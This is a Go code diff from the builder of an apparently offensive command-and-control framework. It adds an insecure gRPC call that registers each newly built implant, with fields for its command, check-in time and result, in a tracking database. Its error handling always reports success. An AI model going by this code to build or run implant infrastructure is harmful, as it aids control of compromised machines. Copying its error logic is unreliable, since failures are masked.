@@ -21,11 +21,13 @@ import (
 	"os/exec"
 	"strings"
 	"text/template"
+	"time"
 	"uuid"
 
 	pb "CloakNDaggerC2/dagger/proto/daggerProto"
 
 	"google.golang.org/grpc"
+	"google.golang.org/grpc/credentials/insecure"
 	"google.golang.org/protobuf/proto"
 )
 
@@ -41,6 +43,18 @@ var (
 	//go:embed templates/*.tmpl
 	rootFs embed.FS
 )
+
+// Struct for saving imp to db
+type ImpUpdate struct {
+	UUID        string
+	Whoami      string
+	Signature   string
+	Retrieved   int32
+	Command     string
+	LastCheckIn string
+	Result      string
+	GotIt       int32
+}
 
 type ImplantStruct struct {
 	platform         string
@@ -222,6 +236,44 @@ func (s *Builder) StartBuilding(ctx context.Context, in *pb.BuildRoutine) (*pb.R
 		}
 		ResponseCode := &pb.ReponseCode{
 			Code: 0,
+		}
+
+		conn, err := grpc.Dial("localhost:50055", grpc.WithTransportCredentials(insecure.NewCredentials()), grpc.WithBlock())
+		if err != nil {
+			log.Fatalf("did not connect : %v", err)
+		}
+
+		defer conn.Close()
+
+		c := pb.NewUpdateRecordClient(conn)
+
+		ctx, cancel := context.WithTimeout(context.Background(), time.Second)
+
+		defer cancel()
+
+		data := []ImpUpdate{
+			{UUID: values.UUID, Whoami: "", Signature: "", Retrieved: 0, Command: "", LastCheckIn: "", Result: "", GotIt: 0},
+		}
+
+		for _, info := range data {
+			res, err := c.SendUpdate(ctx, &pb.UpdateObject{UUID: info.UUID, Whoami: info.Whoami, Signature: info.Signature,
+				Retrieved: info.Retrieved, Command: info.Command, LastCheckIn: info.LastCheckIn, Result: info.Result,
+				GotIt: info.GotIt})
+
+			if err != nil {
+				log.Fatalf("could not save implant: %v", err)
+				ResponseCode = &pb.ReponseCode{
+					Code: 1,
+				}
+			}
+			if res.GetCode() != 0 {
+				ResponseCode = &pb.ReponseCode{
+					Code: 1,
+				}
+			}
+			ResponseCode = &pb.ReponseCode{
+				Code: 0,
+			}
 		}
 		return ResponseCode, err
 	}
